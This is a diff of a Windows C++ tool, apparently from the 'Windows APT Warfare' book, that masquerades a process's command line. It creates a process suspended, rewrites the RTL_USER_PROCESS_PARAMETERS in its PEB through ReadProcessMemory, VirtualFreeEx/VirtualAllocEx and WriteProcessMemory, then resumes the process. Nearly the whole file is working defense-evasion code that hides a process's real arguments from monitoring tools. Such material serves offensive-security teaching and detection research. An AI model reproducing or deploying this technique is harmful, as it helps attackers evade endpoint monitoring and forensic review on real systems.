@@ -1,36 +1,17 @@
-﻿#include <iostream>
-#pragma warning (disable : 4996)
-/**
+﻿/**
  * masqueradeCmdline.cpp
- * 
+ *
  * basic idea from:
  * www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb
  *
  * Windows APT Warfare
  * by aaaddress1@chroot.org
  */
+
 #include <stdio.h>
 #include <windows.h>
 #include <winternl.h>
-typedef struct _PEB32 {
-	UCHAR InheritedAddressSpace;     // +00
-	UCHAR ReadImageFileExecOptions;  // +01
-	UCHAR BeingDebugged;             // +02
-	UCHAR BitField;                  // +03
-	ULONG Mutant;                    // +04
-	ULONG ImageBaseAddress;          // +08
-	_PEB_LDR_DATA * Ldr;             // +0c
-	ULONG ProcessParameters;         // +10
-	ULONG SubSystemData;
-	ULONG ProcessHeap;
-	ULONG FastPebLock;
-	ULONG AtlThunkSListPtr;
-	ULONG IFEOKey;
-	ULONG CrossProcessFlags;
-} PEB32, * PPEB32;
-
-
-
+#pragma warning (disable : 4996)
 typedef struct m_RTL_USER_PROCESS_PARAMETERS {
 	ULONG MaximumLength;
 	ULONG Length;
@@ -48,52 +29,65 @@ typedef struct m_RTL_USER_PROCESS_PARAMETERS {
 	UNICODE_STRING CommandLine;
 };
 
-/*void remoteInitUnicodeString(HANDLE hProcess, size_t ptr_sz32bitUnicode, const wchar_t* newString) {
-	// try to make RtlInitUnicodeString() for remote process.
-	// [memory layout] [WORD: len] [WORD: max_len] [DWORD: ptrToWideString]
+m_RTL_USER_PROCESS_PARAMETERS* readFullPage_RtlusrProcParam(HANDLE hProcess, LPVOID whereParamAt) {
+	// fetch the max_size of that memory page.
+	m_RTL_USER_PROCESS_PARAMETERS tmpUsrProcParam = {};
+	ReadProcessMemory(hProcess, whereParamAt, &tmpUsrProcParam, sizeof(tmpUsrProcParam), 0);
 
-	WORD len = lstrlenW(newString) * sizeof(wchar_t);
-	WriteProcessMemory(hProcess, LPVOID(ptr_sz32bitUnicode + 0), &len, 2, 0);
+	// read the used data of the current struct in that page.
+	m_RTL_USER_PROCESS_PARAMETERS* retUsrProcParam = (m_RTL_USER_PROCESS_PARAMETERS*)new byte[tmpUsrProcParam.MaximumLength + 0x1000];
+	memset(retUsrProcParam, '\x00', tmpUsrProcParam.MaximumLength + 0x1000);
+	ReadProcessMemory(hProcess, whereParamAt, retUsrProcParam, tmpUsrProcParam.MaximumLength, 0);
+	
+	retUsrProcParam->MaximumLength += 0x1000;
+	return retUsrProcParam;
+}
 
-	len = (lstrlenW(newString) + 1) * sizeof(wchar_t);
-	WriteProcessMemory(hProcess, LPVOID(ptr_sz32bitUnicode + 2), &len, 2, 0);
+// UAF method found. To fix abug at Win10 M$ application loader
+// thanks to inndy.tw@gmail.com 
+size_t refresh_allocSizeOfUsrProcParam(HANDLE hProcess, LPVOID whereStructAt, size_t newSize) {
+	if (!VirtualFreeEx(hProcess, whereStructAt, 0, MEM_RELEASE)) return 0;
+	return (size_t)VirtualAllocEx(hProcess, whereStructAt, newSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+}
 
-	LPVOID szUnicodeBuffAt;
-	ReadProcessMemory(hProcess, LPVOID(ptr_sz32bitUnicode + 4), &szUnicodeBuffAt, 4, 0);
-	//VirtualAllocEx(hProcess, 0, len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	//WriteProcessMemory(hProcess, szNewWStringBuf, newString, len, 0);
-
-	WriteProcessMemory(hProcess, szUnicodeBuffAt, newString, len, 0);
-}*/
-
-int main(void) {
-	PROCESS_INFORMATION PI = {}; STARTUPINFOA SI = {}; CONTEXT CTX = { CONTEXT_FULL };
-	m_RTL_USER_PROCESS_PARAMETERS parentParamIn;
-	PEB32 remotePeb;
-
-	char dummyInput[MAX_PATH];
-	memset(dummyInput, 'A', sizeof(dummyInput));
-
-	wchar_t new_szCmdlineUnicode[] = L"/c whoami & echo P1ay Win32 L!k3 a K!ng. & pause";
-
-	if (CreateProcessA("C:/Windows/SysWOW64/cmd.exe", dummyInput, 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI)) {
-		if (GetThreadContext(PI.hThread, &CTX)) {
-
-			ReadProcessMemory(PI.hProcess, LPVOID(CTX.Ebx), &remotePeb, sizeof(remotePeb), 0);
-			printf("[+] imagebase at %p\n", remotePeb.ImageBaseAddress);
-
-			auto paramStructAt = LPVOID(remotePeb.ProcessParameters);
-			ReadProcessMemory(PI.hProcess, paramStructAt, &parentParamIn, sizeof(parentParamIn), 0);
-			
-			size_t whereToWrite = (size_t)paramStructAt + offsetof(m_RTL_USER_PROCESS_PARAMETERS, CommandLine);
-			WriteProcessMemory(PI.hProcess, parentParamIn.CommandLine.Buffer, new_szCmdlineUnicode, sizeof(new_szCmdlineUnicode), 0);
-			// remoteInitUnicodeString(PI.hProcess, whereToWrite, new_szCmdlineUnicode);
-			printf("[+] cmdline unicode current at %p\n", whereToWrite);
-			
-			printf("[+] run...\n\n");
-			ResumeThread(PI.hThread);
-
-		}	
+int wmain(int argc, wchar_t**argv) {
+	if (argc < 3) {
+		puts("usage: mqCmdline [path/to/exe] [arg/to/pass]");
+		puts("  e.g. mqCmdline cmd.exe /c echo 30cm.tw & pause");
+		return 0;
 	}
+
+	PROCESS_INFORMATION PI = {}; STARTUPINFO SI = {}; CONTEXT CTX = { CONTEXT_FULL };
+	wchar_t new_szCmdlineUnicode[0x2000] = { 0 }; PEB remotePeb;
+	
+	// prepare fake cmdline.
+	for (size_t i = 2; i < argc; i++) {
+		wcscat(new_szCmdlineUnicode, argv[i]);
+		wcscat(new_szCmdlineUnicode, L"\x20");
+	}
+	
+	if (CreateProcessW(0, argv[1], 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI))
+		if (GetThreadContext(PI.hThread, &CTX)) {
+			printf("[+] lookup where RTL_USER_PROCESS_PARAMETERS at (from PEB)\n");
+			ReadProcessMemory(PI.hProcess, LPVOID(CTX.Ebx), &remotePeb, sizeof(remotePeb), 0);
+
+			printf("[+] fetch current page memory of the param struct\n");
+			auto rtlParamShouldAt = LPVOID(remotePeb.ProcessParameters);
+			m_RTL_USER_PROCESS_PARAMETERS* disguiseRtlParam = readFullPage_RtlusrProcParam(PI.hProcess, rtlParamShouldAt);
+			refresh_allocSizeOfUsrProcParam(PI.hProcess, rtlParamShouldAt, disguiseRtlParam->MaximumLength);
+
+			printf("[+] preparing new unicode struct for the cmdline\n");
+			memcpy((void*)((size_t)disguiseRtlParam + disguiseRtlParam->Length), new_szCmdlineUnicode, wcslen(new_szCmdlineUnicode) * 2 + 2);
+			disguiseRtlParam->CommandLine.Buffer = (LPWSTR)((size_t)rtlParamShouldAt + disguiseRtlParam->Length);
+			disguiseRtlParam->CommandLine.Length = wcslen(new_szCmdlineUnicode) * 2;
+			disguiseRtlParam->CommandLine.MaximumLength = disguiseRtlParam->CommandLine.Length + 2;
+
+			printf("[+] update RTL_USER_PROCESS_PARAMETERS in remote\n");
+			disguiseRtlParam->Length = disguiseRtlParam->MaximumLength;
+			WriteProcessMemory(PI.hProcess, rtlParamShouldAt, disguiseRtlParam, disguiseRtlParam->MaximumLength, 0);
+			
+			printf("[+] run...\n--\n");
+			ResumeThread(PI.hThread);
+		}	
 	return 0;
 }
